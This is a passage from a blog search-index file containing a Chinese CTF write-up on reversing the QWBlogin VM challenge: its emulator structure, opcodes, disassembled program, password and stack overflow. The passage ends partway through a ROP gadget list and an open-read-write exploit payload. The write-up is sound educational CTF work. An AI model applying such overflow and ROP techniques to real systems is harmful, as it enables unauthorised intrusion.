<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/08/25/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/08/25/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p><p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//链表结构 可能记录 segment flag 的</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p><h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="简易-emulator"><a href="#简易-emulator" class="headerlink" title="简易 emulator"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p><p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p><p>其中标记为<code>R</code>的是不需要限制的</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span 